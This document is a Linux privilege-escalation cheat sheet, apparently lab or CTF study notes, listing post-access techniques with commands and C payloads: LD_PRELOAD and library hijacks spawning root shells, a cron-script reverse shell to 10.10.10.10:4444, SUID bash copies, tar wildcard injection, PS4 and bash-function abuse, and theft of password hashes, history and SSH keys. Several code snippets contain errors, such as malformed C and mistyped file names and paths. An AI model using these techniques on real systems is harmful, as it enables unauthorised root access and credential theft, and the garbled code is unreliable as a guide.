# Debian Privilege Escalation Example
This assumes you have gained initial access to the box.

## 1. User information
Run the id command to see the current user configuration.
```sh
id

uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

Check to see what programs the user can run:
```sh
sudo -l
```

## 2. Weak file permissions

### /etc/shadow
If the file is readable you can crack the hashes:
```sh
john --wordlist=rockyou.txt hash.txt
```

If the file is writable, you can add a new password:
```sh
mkpasswd -m sha-512 newpass
```

### /etc/passwd
If the file is writable, add new hash:
```sh
openssl passwd newpass
```

## 3. Shell escape sequences
Reference: [GTFOBins](https://gtfobins.github.io)

## 4. Evironment Variables
The `env_keep` options indicate which variables have been inherited.
```sh
sudo -l

Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```

`LD_PRELOAD` - loads a shared object before any others when a program is run.
`LD_LIBRARY_PATH` - list of directories where shared libraries are searched for first.

### Preload escalation:
Create a shared object (preload.c):
```sh
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void_init() {
    unsetenv('LD_PRELOAD');
    setresuid(0,0,0);
    system('/bin/bash -p');
}
```

Execute it against a program (more) & get root:
```sh
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
sudo LD_PRELOAD=/tmp/preload.so more

more
```

### Library path escalation:
Identify which shared  libraries are used by the program.
```sh
ldd /usr/sbin/apache2
```

Create a shared object with the same name as the listed libraries (libcrypt.so.1)

hijack.c
```sh
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv('LD_LIBRARY_PATH');
    setresuid(0,0,0);
    system('/bin/bash -p');
}
```

Gain root shell:
```sh
gcc -o /tmp/libcrypt.so.1 -shared -fPIC hjack.c
sudo LD_LIBRARY_PATH=/tmp apache2
```

## Cron Jobs

### Weak file permissions:
If a file is scheduled to run periodically we may be able to exploit it.

```sh
cat /etc/crontab

locate interestingscript.sh

ls -l interestingscript.sh

```

Change the contents of the file to:
```sh
#!/bin/bash

bash -i >& /dev/tcp/10.10.10.10/4444 0 >& 1
```

### PATH environment variable
The following path shows the user's home directory. At this point we don't need to edit the `interestingscript.sh` we can just load a new one from the user directory.
```sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

Copy bash to the temp folder:
```sh
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Run the shell:
```sh
/tmp/rootbash -p
```

### Wild card injection
Given this example script that is being run with a wildcard inside your home directory. Using `GTFOBins` we can exploit `tar`

```sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

Create 2 files in the `/home/user` directory:
```sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf

-rw-r--r-- user user --checkpoint=1
-rw-r--r-- user user --checkpoint-action=exec=shell.elf
```

When the tar command expands these files they will be executed as options.

## SUID / SGID Executables - Known Exploits
Find all SUID/SGID executables and look to see if their versions can be exploited:
```sh
find / -user root -perm -4000 -exec ls -ldb {} \;
find / -perm -u=s -type f 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

## SUID / SGID Executables - Shared Object Injection
When you find an executable, you can trace it's system calls using `strace`. We are looking to see an error that a file has not been found in an area of the system we can write to.
```sh
strace example-so 2>&1 | grep -iE "open|access|no such file"
```

Create a payload: (inject.so)
```sh
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    system('/bin/bash -p');
}
```

Compile code into a shared object:
```sh
gcc -shared -fPIC -o libcalc.so inject.so
```

When the program is run again, you will get a root shell.

## SUID / SGID Executables - Environment Variables
If an executable inherits the users PATH and tries to execute programs without specifying an absolute path we can exploit it.

When we search the executable for strings we can see it calls apache, but the `service` command is relative.

/usr/local/bin/vulnerable
```sh
strings vulnerable

# --output--
service apache2 start
```

Create a malicious version of the `service` script (malicious-service.c):
```sh
int main() {
    setuid(0);
    system('bin/bash -p');
}
```

Compile it and add to path:
```sh
gcc -o service malicious-service.c

PATH=.:$PATH /usr/local/bin/vulnerable
```

## SUID / SGID Executables - Shell Features
```sh
/bin/bash --version
```

### bash versions < 4.2-048 
it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any executable.

```sh
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```


### bash versions < 4.4
In debugging mode bash uses the environment variable `PS4` to display a prompt. We can abuse this be setting the variable to an embedded command.
```sh
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)'
```

## History
Sometimes passwords can be included in the `history`
```sh
cat ~/.*history | less
```

## Passwords & Keys 

### Config Files
Configuration files sometimes store passwords in clear text.
```sh
ls /home/user

myvpn.ovpn
```

### SSH Keys
If an ssh key is readable it can be copied.
```sh
ls .ssh

-rw-r--r-- 1 root root 0000 Aug 25 2024 root_key
```

On the new machine:
```sh
chmod 600 root_key
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa oHostKeyAlgorithms=+ssh-rsa root@10.10.10.10
```

## NFS
If root squashing is disabled we can elevate our permissions because NFS files retain the remote user id.
```sh
cat /etc/exports

#-- example root squash setting --
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

Mount an NFS share and save the payload to it. When the payload is accessed, you are elevated to root.
```sh
mkdir /tmp/nfs
mount -o rw, vers=3 10.10.10.10:/tmp /tmp/nfs

chmod +xs /tmp/nfs/shell.elf
```


